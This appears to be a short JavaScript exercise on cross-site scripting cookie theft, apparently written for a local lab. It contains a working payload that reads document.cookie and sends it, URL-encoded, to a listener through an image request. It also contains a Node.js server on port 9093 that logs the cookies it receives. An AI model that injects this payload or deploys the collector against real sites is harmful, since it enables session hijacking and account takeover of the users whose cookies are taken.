/* Logging script */
var userCookie = document.cookie;
alert("User's cookie: "+userCookie);
(new Image()).src='http://localhost:9093?' + 'payload=' + 
encodeURIComponent(userCookie) + '&random=' + Math.random();

/* Server (added decodeURIComponent) 
/*
A HTTP server that runs on port 9093.
*/
var http = require("http");
var url = require("url");

http
  .createServer(function (req, res) {
    var urlObject = url.parse(req.url, true);
    var decoded = decodeURIComponent(urlObject.query.payload);
    console.log(decoded);
    res.end();
  })
  .listen(9093);

console.log("Server started on localhost:9093; press Ctrl-C to 
terminate...");

*/
